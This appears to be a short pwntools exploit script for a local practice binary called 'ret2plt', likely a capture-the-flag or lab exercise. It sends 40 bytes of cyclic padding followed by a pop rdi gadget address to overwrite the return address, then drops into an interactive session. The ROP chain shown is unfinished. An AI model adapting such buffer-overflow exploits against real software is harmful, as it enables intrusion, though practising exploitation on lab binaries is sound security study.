from pwn import *

context.log_level = 'debug'
elf = context.binary = ELF('./ret2plt')

io = process()

pop_rdi = pack(0x00000000004012c3)


payload = cyclic(40) + pop_rdi
 
io.sendline(payload)

io.interactive()